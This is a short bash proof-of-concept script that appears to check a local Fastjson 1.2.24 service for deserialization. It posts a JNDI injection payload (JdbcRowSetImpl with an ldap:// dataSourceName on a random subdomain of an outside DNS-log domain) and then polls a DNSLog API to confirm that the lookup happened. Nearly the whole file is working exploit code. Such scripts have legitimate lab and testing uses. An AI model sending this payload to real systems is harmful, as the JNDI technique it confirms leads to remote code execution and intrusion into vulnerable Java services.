#!/bin/bash

# Configuration
FASTJSON_URL="http://localhost:8090/"
DNSLOG_API="http://localhost:8081/api/logs"

echo "[*] Generating random subdomain for DNSLog verification..."
RAND_STR=$(LC_ALL=C tr -dc 'a-z0-9' </dev/urandom | head -c 8)
DNS_PREFIX="fastjson-${RAND_STR}"
DNS_DOMAIN="${DNS_PREFIX}.log.rcs-team.com"

echo "[*] Subdomain: ${DNS_DOMAIN}"

echo "[*] Sending Fastjson payload to ${FASTJSON_URL}..."

# Payload for 1.2.24 fastjson to trigger DNS resolution via JNDI JdbcRowSetImpl
PAYLOAD='{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://'${DNS_DOMAIN}'/a","autoCommit":true}}'

curl -s -X POST "${FASTJSON_URL}" \
  -H "Content-Type: application/json" \
  -d "${PAYLOAD}" > /dev/null

echo "[*] Payload sent. Waiting for DNS resolution (3 seconds)..."
sleep 3

echo "[*] Checking DNSLog API for records..."
LOGS=$(curl -s "${DNSLOG_API}")

if echo "$LOGS" | grep -q "${DNS_PREFIX}"; then
    echo "[+] SUCCESS: Vulnerability verified! Found DNSLog record for: ${DNS_DOMAIN}"
    exit 0
else
    echo "[-] FAILED: No DNSLog record found for: ${DNS_DOMAIN}"
    echo "[-] Here are the current logs: "
    echo "$LOGS"
    exit 1
fi
